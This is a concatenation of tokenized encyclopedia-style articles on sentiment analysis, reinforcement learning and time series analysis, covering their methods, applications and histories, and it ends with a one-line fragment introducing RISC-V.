Sentiment Analysis is a process which focuses on analyzing people ’s opinions , feelings , and attitudes towards a specific product , organization or service .
It is not uncommon for us to consider what other people think in our decision - making process .
Prior to the advent of the Internet , many of us relied on friends and families for product or service recommendations , or information when buying a product .
The Internet eases our efforts to get the opinions of the general population .
In a world where colossal amounts of user - generated content is produced every day , it is practically impossible for the human workforce to collect all the data and determine the opinions expressed in those data .
Therefore , there is a need to develop computer algorithms to automate the classification of reviews on the basis of their polarities as : positive , negative or neutral .
What kind of questions are answered by Sentiment Analysis ?
Since Sentiment Analysis tools classify a sample of text as positive , negative or neutral , some of the questions which can be answered using Sentiment Analysis are as follows : Is a given product review positive or negative ?
Is a customer satisfied or dissatisfied based on his email response ?
Based on a sample of tweets , how are people responding to a given ad campaign , product release , or news item ?
How have bloggers ' attitudes about the president changed since the election ?
What are the steps involved in Sentiment Analysis ?
Sentiment Analysis process .
Source : Devopedia 2018 .
Sentiment analysis typically has the following steps : Data acquisition : The collection of data is an important phase since a proper dataset needs to be defined for analyzing and classifying the text in the dataset .
Text preprocessing : After collecting the data , preprocessing allows to reduce noise in the data .
This is done by removing the unnecessary stop words , repeated words , stemming , removal of emoticons , removal of URLs etc .
Feature selection and extraction : Proper selection and extraction of features plays a key role in determining the accuracy of the model .
Hence , the appropriate feature extraction technique must be chosen for extracting the features .
Sentiment classification : In this phase , various sentiment classification techniques are applied to classify the text .
Some popular sentiment classification techniques are Naïve Bayes ( NB ) and Support Vector Machines(SVM ) .
Polarity detection : After classifying the sentiments , the polarity of the sentiment is determined .
The goal of polarity detection is to decide whether a text expresses positive , negative or neutral sentiment .
Validation and evaluation : Finally , validation and evaluation of the obtained results is performed so as to determine the overall accuracy of the techniques used for sentiment analysis .
What are the various approaches to sentiment analysis ?
Sentiment Analysis approaches .
Source : Devopedia 2018 .
ML - based : Classifies the text as positive , negative or neutral using Machine Learning classification algorithms and linguistic features .
Lexicon - based : Makes use of sentiment lexicons . Sentiment lexicons are collections of annotated and preprocessed sentiment terms .
Sentiment values are assigned to words that describe the positive , negative and neutral attitude of the speaker .
It is further classified as : < br>(a ) Dictionary - based method : It uses a small set of seed words and an online dictionary .
The strategy here is that the initial seed set of words with their known orientations are collected and then online dictionaries are searched to find their probable synonyms and antonyms .
The sample is classified based on the presence of such signalling sentiment words .
< br>(b ) Corpus - based method : Uses corpus data to identify sentiment words .
Even though it is not as effective as a dictionary based scheme , it is helpful in finding the domain and context of specific sentiment words against the corpus data .
The algorithm will have access not only to sentiment labels , but also to a context .
Hybrid : It is a combination of both Machine Learning and lexicon - based approaches .
What are the advantages and limitations of the Sentiment Analysis approach ?
Machine Learning based Advantage : Unlike Lexicon - based , these models can be built for a specific purpose or context .
Limitation : Obtaining labeled data for training could be difficult or expensive .
Lexicon - based Advantage : No training is required .
Limitation : Accuracy depends on lexical resources .
Finite number of words in lexicons and the assignment of a fixed sentiment orientation and score to words .
Hybrid : Advantage : It incorporates the best of machine - learning based and Lexicon based approaches .
Generally , Machine Learning based models perform better than Lexicon - based models .
But Machine Learning models require labeled data in huge quantities .
What are some tools available for Sentiment Analysis at present ?
Here are some developer tools for sentiment analysis : Python NLTK : A python based tool for text processing , cataloging , tokenization , stopping , tagging , parsing and much more .
GATE , the General Architecture for Text Engineering : A Java suite of tools used for all sorts of natural language processing tasks , including information extraction in many languages .
LingPipe : LingPipe is a tool kit for processing text using computational linguistics .
LIWC ( Linguistic Inquiry and Word Count ) : A computerized text analysis tool that reads a given text and counts the percentage of words that reflect different emotions , thinking styles and social concerns .
Among other tools are Opinion Finder , Grooper document classification , MonkeyLearn , IBM Watson , Lexalytics , MeaningCloud , Rosette , Repustate , Clarabridge and Aylien .
What are the challenges involved in Sentiment Analysis ?
Human language is intricate .
People often express opinions in complex ways .
To mention a few : Named entity recognition : Locating and classifying named entities in text into pre - defined categories such as the names of persons , organizations , locations .
Eg : Is 300 Spartans a group of Greeks or a movie ?
Anaphora Resolution : It is the problem of resolving references to earlier or later items in the discourse .
Eg : " We watched the movie and went to dinner .
It was awful .
" What does " It " refer to ?
Parsing : This refers to resolving a sentence into its component parts .
What is the subject and object of the sentence ? Which one does the verb and/or adjective actually refer to ?
Rhetorical modes : Typically the analysed posts contain sarcasm , irony , implications , etc , which are particularly difficult to detect .
Social media websites : It is not uncommon to find reviews and opinions containing slang , abbreviations , lack of capital and poor punctuation , which would make sentiment analysis even more challenging .
Visual sentiment analysis : Posts often contain a mixture of visual and textual information .
The sentiment polarities implied by texts may contradict the sentiments of images , which poses a challenge for textual sentiment analysis .
Where is Sentiment Analysis being used at present ?
A very broad answer to this can be broken up into three categories : Brand Monitoring - Sentiment Analysis is used to gauge how a brand , product or company has been received by the public .
In fact , private companies like Unamo offer this as a service .
Customer Service - Customer service agents classify incoming mail into ' urgent ' and ' non - urgent ' , in order to be able to serve the more frustrated customers quicker .
The speech analytics platform Callminer Eureka implements AI and ML techniques to draw insight from consumer interactions , in order to offer quality customer service .
Market Research and Analysis - Opinion mining plays a crucial role in business intelligence , by helping analysts understand why a particular product was well received or not .
Stock markets and hedge funds have been known to shift with the shift in sentiments on social media .
Sentiment analysis has also driven forward various other initiatives .
Bing Search used the concept in their newly launched Multi - Perspective Answers product .
Apart from the above , sentiment analysis is used in the areas of political science , sociology , psychology ; flame detection , identifying child - suitability of videos , bias identification in news sources are a variety of applications .
The history of Sentiment Analysis begins in Ancient Greece with the concept of Doxa , which refers to common belief or popular opinion .
The Harrisburg Pennsylvanian conducts " straw polling " to predict the outcome of the United States presidential election .
The prediction turns out to be incorrect , possibly because it did n't draw the right sample .
Hatzivassiloglou and McKeown use the term semantic orientation in a paper titled Predicting the Semantic Orientation of Adjectives .
Their approach is corpus - based and adapts to new domains .
Thus , it can be told that ' bull ' and ' bear ' are opposites in stock market reports .
Using only adjectives , their model achieves 90 % precision .
Pang and Lee apply machine learning to sentiment analysis .
They propose a subjectivity detector to pick out subjective sentences .
Then they employ text categorization techniques on the subjective sentences .
Algorithms used include Naive Bayes and SVM to find minimum cuts in a graph .
They claim an accuracy of 86.4 % on the NB polarity classifier .
Gruhl et al .
conducted one of the first studies to determine if online comments influence the sales figures of a product .
They obtain the sales data of books from Amazon.com .
From blog mentions and online chatter , they use automated query generation algorithms to predict the rise and fall of sales of certain books .
They find that positive comments lead to increased sales .
Anne Hathaway or Berkshire Hathaway ?
Source : Bhat 2018 .
The shares of Buffet - owned Berkshire Hathaway rose by as much as 2.94 % following the Oscars award ceremony .
Likewise , there 's a correlation between Anne Hathaway 's movie release dates and stock price increases of Berkshire Hathaway during the period 2008 - 2010 .
The reasoning is that automated trading programs are picking up online chatter about ' Hathaway ' and applying it to the stock markets .
This is an example where sentiment analysis fails to understand the context .
Kucuktunc et al .
pioneer large - scale sentiment analysis of Yahoo !
Answers .
They find that answers differ according to the attributes of users , such as the best - rated answers have a neutral tone to them .
They also identify particular feelings evoked on reading a certain question .
These findings have begun to be used in advertising and recommendations .
Aleksandr Kogan collects and provides a database containing information of about 87 million Facebook users to Cambridge Analytica .
Cambridge Analytica subsequently uses it to make 30 million " psychographic " profiles about voters .
In later years , it is alleged that this data was used to influence voter opinion on behalf of politicians who hired them .
Poria et al .
identify the sentiments presented in online videos based on utterances .
An utterance is a unit of speech bound by a pause .
Each utterance is classified subjectively .
Sentiments are applied to aspects in the SentiHood dataset .
Source : Sun et al .
2019 , table 1 .
Sun et al .
apply BERT , a pre - trained neural network language model , to the task of Aspect - Based Sentiment Analysis ( ABSA ) .
Another research group also applies BERT to ABSA to show state - of - the - art results on SemEval-2015 Task 12 subtask 2 and SemEval-2016 Task 5 .
RL 's relation to supervised and unsupervised learning .
Source : Jones 2017 .
Reinforcement Learning ( RL ) is a subset of Machine Learning ( ML ) .
Whereas supervised ML learns from labelled data and unsupervised ML finds hidden patterns in data , RL learns by interacting with a dynamic environment .
Humans learn from experience .
A parent may reward her child for getting good grades , or punish her for bad grades .
By interacting with peers , parents and teachers , the child learns what habits lead to good grades and what lead to bad grades .
It learns to follow good habits to obtain good grades and higher rewards .
In RL , this sort of feedback is called reward or reinforcement .
The essence of RL is to learn how to act or behave in order to maximize rewards .
A suitable definition is that reinforcement learning is the problem faced by an agent that must learn behaviour through trial - and - error interactions with a dynamic environment .
Could you explain reinforcement learning with an example ?
The game of Pong .
Source : Karpathy 2016 .
Thomas Edison , the inventor of the light bulb , reportedly performed thousands of experiments before arriving at a carbon filament taken from a shred of bamboo .
Edison said , " I have not failed 10,000 times .
I have succeeded in proving that those 10,000 ways will not work .
" This anecdote is relevant to reinforcement learning .
RL welcomes mistakes .
RL is about learning what works and what does n't through many trial - and - error experiments .
In the game of Pong , a ball bounces back and forth between two paddles .
Our RL - trained agent software controls one paddle .
The rewards in this simple game are clear : +1 if the ball beats the opponent , -1 if we miss the ball , 0 otherwise .
Our agent can see the current state of the game in terms of pixels .
Based on this input and what the agent has learned so far , it decides if it has to move its paddle up or down .
The agent may lose the game many times , but via negative rewards it will learn to avoid those paddle actions .
Likewise , it will learn what paddling actions lead to high rewards .
Why do we need reinforcement learning ?
Reinforcement learning differs from other ML approaches .
Unlike supervised learning , there 's no supervision in RL , only a reward signal .
Feedback is delayed , not instantaneous .
In a chess game , long - term reward is apparent only after a series of moves .
In supervised or unsupervised learning , a static dataset is usually the input .
Reinforcement learning happens within a dynamic environment .
Data is not independent and identically distributed .
The agent can take many different exploratory paths through the environment .
Immediate action affects the subsequent data the agent receives .
In many complex problems , the only way to learn is by interacting with the environment .
In complex board games , it 's hard for humans to provide evaluations of a large number of positions .
It 's easier to learn the evaluation function via rewards .
Which are some practical applications of reinforcement learning ?
RL has wide applications in many fields : robotics and industrial automation , data science and machine learning , personalized education and training , healthcare , natural language processing , media and advertising , trading and finance , autonomous driving , gaming and many more .
RL can optimize operations in many industries .
Google used it to reduce energy consumption in its data centers .
Process planning , demand forecasting , warehouse operations ( such as picking and placing ) , fleet logistics , inventory management , delivery management , fault detection , camera tuning , and computer networking are some applications that RL can optimize .
We note a few specific areas : Machine Learning : For a given problem , identify suitable neural network architectures .
Google 's AutoML based on RL does exactly this .
RL models could assist software developers to write computer programs .
NLP : Generate summarizes from long text .
Assist chatbots to learn from user interactions and respond to queries in a more natural manner .
Useful for question answering and machine translation .
Media & Advertising : Give personalized content recommendations .
Use in cross - channel marketing optimization and real - time bidding systems .
Optimize video streaming quality .
Deliver more meaningful notifications to users .
Healthcare : Dynamic treatment regimes , automated medical diagnosis , process control , drug discovery , health management .
How is reinforcement learning related to other fields ?
RL shares similarities with other fields .
Source : Sheng 2018 .
RL has interesting parallels with other fields : Neuroscience : The brain learns via reinforcement .
Synaptic associations are strengthened or weakened based on conditioned and unconditioned stimuli .
In humans , dopamine serves as a reward .
Psychology : New behaviours are learned via associations .
Reward and punishment are used to modify behaviour .
Operant conditioning closely relates to RL .
Economics : Behaviour economics is concerned with decision making .
While rational economic agents maximize utility , humans are not fully rational .
We often optimize for satisfaction .
The similarity with RL is that agents often have incomplete information about the environment .
Mathematics : Operations Research ( OR ) is a field that 's similar to RL .
OR employs analytical methods to aid decision making .
System simulations leading to reward maximization or cost minimization are OR concerns .
Engineering : Control problems involve a cost function of state and variables .
Differential equations model the path of control variables .
Equivalent RL concepts are policy ( controller ) , actions ( actuator commands ) , observations ( state feedback ) and reward / observations ( reference signal ) .
What are some essential terms in RL ?
It 's easier to understand RL , once we get familiar with these essential terms : Agent : An entity that 's being trained to perform a specific task by interacting with the environment .
It 's sometimes called control .
Environment : That is everything except the agent .
This includes system dynamics .
State : Parameter values that define the current configuration of the environment .
Action : An agent outputs an action to the environment and thereby changes the environment 's status .
Action itself is determined by observed states and policy .
Reward : The numerical result of taking an action in a given state .
Return or utility is the sum of current and future rewards when following a sequence of states .
Utility is also called long - term reward .
Policy : A function that takes state observations as inputs and outputs actions .
It has a logical structure and tunable parameters that the agent learns .
The agent 's goal is to learn the optimal policy to maximize reward or utility .
Equivalently , it 's a probabilistic mapping of states to actions .
How does learning happen in RL ?
Learning happens via interactions between the agent and its environment .
Source : Arulkumaran et al .
2017 , fig .
2 .
The agent starts by observing the environment 's status .
Based on the current policy , the agent acts .
This action changes the environment 's status .
In return , the agent gets a reward .
From the reward , the agent determines if the action was beneficial .
A positive reward reinforces the action or agent 's behaviour .
A negative reward informs the agent to avoid such an action , at least in a particular state .
This feedback cycle of observe - act - reward - update is repeated many times .
The agent learns with each iteration .
A perfect policy is learned when the agent knows exactly what action to take in every possible state .
In practice , this is rare .
The environment is not static .
The agent might encounter new states never seen before during the learning phase .
In some cases , it 's not possible to accurately observe the environment 's status .
The technical term for this is Partially Observable Markov Decision Process ( POMDP ) .
Therefore , in practice , we need an RL algorithm .
Its role is to update the policy based on states , actions and rewards .
In this way , it responds to changing environments .
What are the main approaches to reinforcement learning ?
Consult the model before interacting with the environment .
Source : Adapted from MathWorks 2020 , slide 19 .
If RL has knowledge of the environment and models it , then we call it model - based RL .
A model guides the agent to learn faster by ignoring low - reward states .
If learning is done only via interactions with the environment without any knowledge of how the environment works , then we call it model - free RL .
In passive RL , the policy is fixed and the agent learns the utilities of states , possibly involving learning a model .
In active RL , the agent must learn what actions to take .
An active agent explores the state of space to obtain a better model and higher rewards .
During state space exploration , the current policy may not be followed .
We call this off - policy learning .
Otherwise , the algorithm is on - policy learning .
A stochastic policy allows exploration .
Instead of interacting with the environment , it 's possible to learn from large datasets of past interactions .
This data - driven approach is called offline or batch RL .
Where deep neural networks are employed , the term Deep RL is common .
What are some specialized approaches to reinforcement learning ?
Typically , a single agent learns .
Multiple agents coordinating and learning to maximize a common utility function is called distributed RL .
Multiple agents who typically do n't coordinate their actions and having separate utility functions are part of multiagent RL .
In fact , one agent may work against another agent ( such as in Markov games ) , thus making the environment non - stationary .
Hierarchical RL considers hierarchies of policies .
Top - level policies might focus on high - level goals , while others offer finer control .
Where it 's not easy to define the reward function , the agent can learn from examples without explicit rewards .
This is called apprenticeship or imitation learning .
Learning the reward function from examples is called inverse RL .
Learning typically happens with atomic states .
Instead , if we use structured representations , the approach is called relational RL .
In RL , should an agent learn via simulations or within a real environment ?
Real - world observations train a model that can be used to optimize a policy .
Source : Kaiser and Erhan 2019 .
A real environment is better if it 's difficult to model or it 's constantly changing .
Learning requires lots of samples and to do this in a real environment is time - consuming .
Simulations are faster than in real time .
Multiple simulations can be executed in parallel .
A simulated environment is also safe .
Simulations are useful to test rare events such as car crashes .
But the simulated environment may not accurately model many aspects of the real environment .
Balancing an inverted pendulum is a task that can be learned in a real environment because it 's safe .
Training a walking robot that has had no prior training may not be safe or effective in a real environment .
It 's better to train it in a simulated environment and then use a real environment for scenarios that simulations did n't cover .
In practice , it 's common for an agent to gather real - world observations .
These are used to update the current model .
The agent then learns within a simulated environment based on the updated model .
What are some challenges or shortcomings of RL ?
RL has progressed in areas such as gaming and robotics where lots of simulated data is available .
Translating these advances into practical applications is not trivial .
RL demands much more training data than supervised ML .
Learning from scratch with no priori knowledge , called pure RL , has been criticized because learning is too slow .
RL shares with AI some common problems : algorithms are not predictable or explainable , can be trained for only a narrowly - defined task , and do n't generalize well unless trained on massive amounts of data .
Basic assumptions may not hold good in real environments .
The environment may not be fully observable .
Even observed states can be inaccurate .
Sometimes it is not obvious or easy to figure out a suitable reward function , especially when there are multiple objectives .
While the agent learns by mistakes , sometimes there 's limited freedom to explore .
For complex problems , it 's not clear how to trade - off simulation complexity , training time and real - time performance constraints .
Many approaches use discrete actions and states .
In the real world , agents have to interact in a continuous space .
Policy optimization has become a lot harder .
RL algorithms can get stuck in a local optima .
In an English translation of Pavlov 's work on conditioned reflexes , the term reinforcement is used for the first time in the context of animal learning .
Pavlovian conditioning comes from the work of Ivan Pavlov in the 1890s .
Pavlov discovered how dogs would salivate upon seeing food but also when given associated stimuli even without food .
Alan Turing describes in a report the design of a pleasure - pain system .
He notes that the computer makes and records a random choice when faced with incomplete data .
Subsequently , " When a pain stimulus occurs , all tentative entries are cancelled , and when a pleasure stimulus occurs they are all made permanent .
" This decade sees the development of optimal control whose aim is to design a controller that minimizes some measure of a dynamic system 's behaviour over time .
Richard Bellman develops the relevant theory , including the Bellman Equation , dynamic programming and Markov Decision Process ( MDP ) .
In 1960 , Ronald Howard devised the policy iteration method for MDPs .
Arthur Samuels , as part of his program to play checkers , implements a learning method based on temporal - differences .
This relies on differences between successive estimates of the same quantity .
It 's inspired by animal learning psychology and the idea of secondary reinforcers .
In 1972 , Klopf brought together trial - and - error learning with temporal - difference learning .
Minsky publishes a paper titled Steps Toward Artificial Intelligence that raises many issues relevant to reinforcement learning .
He writes about the credit assignment problem , that is , how to credit success when a sequence of decisions has led to the final result .
Through the 1960s , the terms " reinforcement " and " reinforcement learning " were increasingly used in literature .
At the same time , some researchers working on pattern recognition and perceptual learning ( these really belong to supervised ML ) confuse these with RL .
The cart - pole problem has four state variables : the cart 's position and velocity , the pole 's angle and its differential .
Source : Michie and Chambers 1968 , fig .
6 .
Improving on their work in the early 1960s , Michie and Chambers trained an RL algorithm to play tic - tac - toe and another to balance a pole on a movable cart .
The pole - balancing task was learned with incomplete knowledge of the environment .
This work influences later research in the field .
In 1974 , Michie notes that trial - and - error learning is an essential aspect of AI .
Chris Watkins integrates the separate threads of dynamic programming and online learning .
He formalizes reinforcement learning with MDP , subsequently adopted by other researchers .
He proposes Q - Learning , a model - free method .
The work of Watkins was preceded by Paul Werbos in 1977 , who saw how dynamic programming could be related to learning methods .
Architecture of Dyna .
Source : Sutton 1990 , fig .
1 .
Sutton proposes Dyna , a class of architecture that integrates reinforcement learning and execution - time planning .
The system can alternate between the real world and a learned model of the world .
Using simulated experiences ( planning steps ) in the world model , the optimal path is discovered faster .
He applies Dyna to both policy iteration and Q - Learning .
Gerry Tesauro developed TD - Gammon that can compete with human experts in the game of backgammon .
TD - Gammon learned from self - play alone without human intervention .
The only rewards came at the end of each game .
The evaluation function is a fully connected neural network with one hidden layer of 40 nodes .
Previously , Tesauro attempted to train a neural network in a supervised manner with experts assigning relative values to moves .
This approach was tedious and the program failed against human players .
Developed by DeepMind Technologies , AlphaGo beat Lee Sedol , a human champion in the game of Go .
AlphaGo was trained using RL from games involving human and computer play .
The architecture is model - based learning using Monte Carlo Tree Search ( MCTS ) and model - free learning using neural networks .
In 2017 , AlphaZero Go was released and it beat AlphaGo by 100 - 0 .
Also in 2017 , AlphaZero be released as a generalization of AlphaZero Go .
AlphaZero can play chess , shogi and Go .
Time series data is an ordered sequence of observations of well - defined data items at regular time intervals .
Examples include daily exchange rates , bank interest rates , monthly sales , heights of ocean tides , or humidity .
Time Series Analysis ( TSA ) finds hidden patterns and obtains useful insights from time series data .
The TSA is useful in predicting future values or detecting anomalies across a variety of application areas .
Historically , TSA was divided into time - domain and frequency - domain approaches .
The time domain approach used the autocorrelation function whereas the frequency domain approach used the Fourier transform of the autocorrelation function .
Likewise , there are also Bayesian and non - Bayesian approaches .
Today , these differences are of less importance .
Analysts use whatever suits the problem .
While most methods of TSA are from classical statistics , since the 1990s , artificial neural networks have been used .
However , these can excel only when sufficient data is available .
What are the main objectives of time series analysis ?
TSA has the following objectives : Describe : Describe the important features of the time series data .
The first step is to plot the data to look for the possible presence of trends , seasonal variations , outliers and turning points .
Model : Investigate and find out the generating process of the time series .
Predict : Forecast future values of an observed time series .
Applications are in predicting stock prices or product sales .
What are some applications of time series analysis ?
Time series analysis for anomaly detection .
Source : Krishnan 2019 .
TSA is used in numerous practical fields such as business , economics , finance , science , and engineering .
Some typical use cases are Economic Forecasting , Sales Forecasting , Budgetary Analysis , Stock Market Analysis , Yield Projections , Process and Quality Control , Inventory Studies , Workload Projections , Utility Studies , and Census Analysis .
In TSA , we collect and study past observations of time series data .
We then develop an appropriate model that describes the inherent structure of the series .
This model is then used to generate future values for the series , that is , to make forecasts .
Time series analysis can be termed as the act of predicting the future by understanding the past .
Forecasting is a common need in business and economics .
Besides forecasting , TSA is also useful to see how a single event affects the time series .
The TSA can also help towards quality control by pointing out data points that are deviating too much from the norm .
Control and monitoring applications of TSA are more common in science and industry .
What are the main components of time series data ?
Components of time series data .
Source : Zhao 2011 .
There are many factors that result in variations in time series data .
The effects of these factors are studied by following four major components : Trends : A trend exists when there is a long - term increase or decrease in the data .
It does n't have to be linear .
Sometimes we will refer to a trend as " changing direction " when it goes from an increasing trend to a decreasing trend .
Seasonal : A seasonal pattern exists when a series is influenced by seasonal factors ( quarterly , monthly , half - yearly ) .
Seasonality is always of a fixed and known period .
Cyclic Variation : A cyclic pattern exists when data exhibits rises and falls that are not of a fixed period .
The duration of these cycles is more than a year .
For example , stock prices cycle between periods of high and low values , but there 's no set amount of time between those fluctuations .
Irregular : The variation of observations in a time series which are unusual or unexpected .
It 's also termed as a Random Variation and is usually unpredictable .
Floods , fires , revolutions , epidemics , and strikes are some examples .
What is a stationary series and how important is it ?
Stationary vs non - stationary series .
Source : Mitrani 2020 .
Given a series of data points , if the mean and variance of all the data points remain constant with time , then we call it a stationary series .
If these vary with time , we call it a non - stationary series .
Most prices ( such as stock prices or price of Bitcoins ) are not stationary .
They are either drifting upward or downward .
Non - stationary data are unpredictable and can not be modeled or forecasted .
The results obtained by using non - stationary time series may be spurious in that they may indicate a relationship between two variables where one does n't exist .
In order to receive consistent , reliable results , non - stationary data needs to be transformed into stationary data .
Given a non - stationary series , how can I make it stationary ?
Differencing time series .
Source : Shmueli 2016 .
The two most common ways to make a non - stationary time series curve stationary are : Differencing : In order to make a series stationary , we take a difference between the data points .
Suppose the original time series is \(X_1 , X_2 , X_3 , \ldots X_n\ ) .
series with a difference of degree 1 becomes \(X_2-X_1 , X_3-X_2 , X_4-X_3 , \ldots , X_n - X_{n-1}\ ) .
If this transformation is done only once in a series , we say that the data has been first differenced .
This process essentially eliminates the trend if the series is growing at a fairly constant rate .
If it 's growing at an increasing / decreasing rate , we can apply the same procedure and change the data again .
The data would then be later differenced .
Transformation : If the series ca n't be made stationary , we can try transforming the variables .
Log transform is probably the most commonly used transformation for a diverging time series .
However , it 's normally suggested to use transformation only when differencing is not working .
What are the different models used in Time Series Analysis ?
Some commonly used models for TSA are : Auto - Regressive ( AR ) : A regression model , such as linear regression , models an output value based on a linear combination of input values .
\(y = \beta_0 + \beta_1x + \epsilon\ ) .
In TSA , input variables are observations from previous time steps , called lag variables .
For p=2 , where p is the order of the AR model , AR(p ) is \ ( x_t = \beta_0 + \beta_1 x_{t-1 } + \beta_2 x_{t-2}\ ) Moving Average ( MA ) : This uses past forecast errors in a regression - like model .
For q=2 , MA(q ) is \(x_t = \theta_0 + \theta_1 \epsilon_{t-1 } + \theta_2 \epsilon_{t-2}\ ) Auto - Regressive Moving Average ( ARMA ) : This combines both AR and MA models .
ARMA(p , q ) is \(\begin{align}x_t = & \beta_0 + \beta_1 x_{t-1 } + \beta_2 x_{t-2 } + \ldots + \beta_p x_{t - p } + \\ & \theta_0 + \theta_1 \epsilon_{t-1 } + \theta_2 \epsilon_{t-2 } + \ldots + \theta_q \epsilon_{t - q } \end{align}\ ) Auto - Regressive Integrated Moving Average ( ARIMA ) : The above models ca n't handle non - stationary data .
ARIMA(p , d , q ) handles the conversion of non - stationary data to stationary : I refers to the use of differencing , p is lag order , d is degree of differencing , q is average window size .
What are autocorrelations in the context of time series analysis ?
Time series plot of a spring wave and its correlogram .
Source : Holmes et al .
2020 , fig .
4.13 .
Autocorrelations are numerical values that indicate how a data series is related to itself over time .
It measures how strongly data values separated by a specified number of periods ( called the lag ) are correlated to each other .
The Auto - Correlation Function ( ACF ) defines autocorrelation to a specific lag .
Autocorrelations may range from +1 to -1 .
A value close to +1 indicates a high positive correlation , while a value close to -1 implies a high negative correlation .
These measures are most often evaluated through graphical plots called correlograms .
A correlogram plots the auto - correlation values against lag .
Such a plot helps us choose the order parameters for the ARIMA model .
In addition to suggesting the order of differencing , ACF plots can help in determining the order of MA(q ) models .
Partial Auto - Correlation Function ( PACF ) correlates a variable with its lags , conditioned on the values in between .
PACF plots are useful when determining the order of AR(p ) models .
How do I build a time series model ?
Three - stage Box - Jenkins methodology .
Source : San - Juan et al .
2012 , fig .
4 .
ARMA or ARIMA are standard statistical models for time series forecast and analysis .
Along with its development , the authors Box and Jenkins also suggested a process for identifying , estimating , and checking models .
This process is now referred to as the Box - Jenkins ( BJ ) Method .
It 's an iterative approach that consists of the following three steps : Identification : Involves determining the order ( p , d , q ) of the model in order to capture the salient dynamic features of the data .
This mainly leads to the use of graphical procedures such as time series plot , ACF , PACF , etc .
Estimation : The estimation procedure involves using the model with p , d and q orders to fit the actual time series and minimize the loss or error term .
Diagnostic checking : Evaluate the fitted model in the context of the available data and check for areas where the model may be improved .
How do we handle random variations in data ?
Exponential smoothing is explained with an example .
Source : Emmanuel 2015 .
Whenever we collect data over some period of time , there 's some form of random variation .
Smoothing is the technique to reduce the effect of such variations and thereby bring out trends and cyclic components .
There are two distinct groups of smoothing methods : Averaging Methods : < br>(a ) Moving Average : we forecast the next value by averaging ' p ' previous values .
< br>(b ) Weighted Average : we assign weights to each of the previous observations and then take the average .
The sum of all the weights should be equal to 1 .
Exponential Smoothing Methods : It assigns exponentially decreasing weights as the observation gets older .
In other words , recent observations are given relatively more weight in forecasting than the older observations .
There are several varieties of this method : < br>(a ) Simple exponential smoothing for series with no trend and seasonality : the basic formula for simple exponential smoothing is \(S_{t+1 } = \alpha y_t + ( 1-\alpha)S_t , \qquad 0 < \alpha < = 1 , t > 0\ ) < br>(b ) Double exponential smoothing for series with a trend and no seasonality .
< br>(c ) Triple exponential smoothing for series with both trend and seasonality .
Births and deaths for the year 1605 - 1606 .
Source : Morris et al .
1759 .
John Graunt publishes a book titled Natural and Political Observations … Made upon the Bills of Mortality .
The book contains the number of births and deaths recorded weekly for many years starting from the early 17th century .
It also includes the probability that a person dies at a certain age .
Such tables of life expectancy later become known as actuarial tables .
This is one of the earliest examples of a time series style of thinking applied to medicine .
Robert FitzRoy coins the term " weather forecast " .
Such forecasts started appearing in The Times in August 1861 .
Atmospheric data collected from many parts of England is relayed by telegraph to London , where FitzRoy analyzes the data ( along with past data ) to make forecasts .
His forecasts forewarn sailors of impending storms and directly contribute to reducing shipwrecks .
Possibly the first ECG of the human heart .
Source : Waller 1887 , fig .
1 .
Augustus D. Waller , a doctor by profession , records what is possibly the first electrocardiogram ( ECG ) .
As practical ECG machines arrived in the early 20th century , the TSA has applied to estimate the risk of cardiac arrests .
In the 1920s , the electroencephalogram ( EEG ) was introduced to measure brain activity .
This gives doctors more opportunities to apply to the TSA .
Time series analysis of Wolfe 's sunspot numbers .
Source : Yule 1927 , fig .
8 .
Yule applies harmonic analysis and regression to determine the periodicity of sunspots .
He separates periodicity from superposed fluctuations and disturbances .
Yule 's work starts with the use of statistics in TSA .
In general , the application of autoregressive models is due to Yule and Walker in the 1920s and 1930s .
Muth establishes a statistical foundation for Simple Exponential Smoothing ( SES ) by showing that it 's optimal for a random walk plus noise .
Further advances to exponential smoothing happen in 1985 : Gardner gives a comprehensive review of the topic ; Snyder links SES to innovation state space model , where innovation refers to the forecast error .
The combined forecast improves on individual forecasts .
Source : Bates and Granger 1969 , table 1 .
Bates and Granger show that by combining forecasts from two independent models , we can achieve a lower mean square error .
They also propose how to derive the weight in which the two original forecasts are to be combined .
The same year , David Reid publishes his PhD thesis that 's probably the first non - trivial study of time series forecast accuracy .
Box and Jenkins published a book titled Time Series Analysis : Forecasting and Control .
This work popularizes the ARIMA model with an iterative modelling procedure .
Once a suitable model is built , forecasts are conditional expectations of the model using the mean squared error ( MSE ) criterion .
At the time , this model was called the Box - Jenkins Model .
Through the 1970s , many statisticians continued to believe that there was a single model waiting to be discovered that could best fit any given time series data .
However , empirical evidence shows that an ensemble of models gives better results .
These debates cause George Box to famously remark that all models are wrong but some are useful . Makridakis and Hibon use 111 time series data and compare the performance of many forecasting methods .
Their results claim that a combination of simpler methods can outperform a sophisticated method .
This causes a stir within the research community .
To prove the point , Makridakis and Hibon organized a competition , called M - Competition starting from 1982 : 1001 series ( 1982 ) , 29 series ( 1993 ) , 3003 series ( 2000 ) , 100,000 series ( 2018 ) , and 42,840 series ( 2020 ) .
Although Kalman filtering was invented in 1960 , it was only in the 1980s that statisticians started using state - space parameterization and Kalman filtering for TSA .
The recursive form of the filter enables efficient forecasting .
An ARIMA model can be put into a state - space model .
Similarly , a state - space model suggests an ARIMA model .
Robert Engle developed the Autoregressive Conditional Heteroskedasticity ( ARCH ) model to account for time - varying volatility observed in economic time series data .
In 1986 , his student , Time Bollerslev , developed the Generalized ARCH ( GARCH ) model .
In general , the variance of the error term depends on past error terms and their variance .
ARCH and GARCH are non - linear generalizations of the Box - Jenkins model .
Engle and Grange propose cointegration as a technique for multivariate TSA .
Cointegration is a linear combination of marginally unit - root nonstationary series to yield a stationary series .
This has become a popular method in econometrics due to the long - term relationship between variables .
An earlier method of multivariable TSA is the Vector Autoregressive ( VAR ) model .
Zhang et al .
publish a survey of neural networks applied to forecasting .
They note an early work by Lapedes and Farber ( 1987 ) who proposed multi - layer feedforward networks .
However , the use of ANNs for forecasting happened mostly in the 1990s .
In general , feedforward or recurrent networks are preferred .
At most , two hidden layers are used .
The number of input nodes corresponds to the number of lagged observations needed to discover patterns in data .
The number of output nodes corresponds to the forecasting horizon .
Sánchez - Sánchez et al .
highlight many issues with using neural networks for TSA .
There 's no clarity on how to select the number of inputs or hidden neurons .
There 's no guidance on how best to partition the data into training and validation sets .
It 's not clear if data needs to be preprocessed or if seasonal / trend components have to be removed before data goes into the model .
In 2018 , Hyndman commented that neural networks perform poorly due to insufficient data .
This is likely to change as data becomes more easily available .
RISC - V logo .
Source : Wikipedia 2018 .
When computers " compute " , they 're in fact executing instructions that are defined by what 's known as Instruction Set Architecture ( ISA ) .
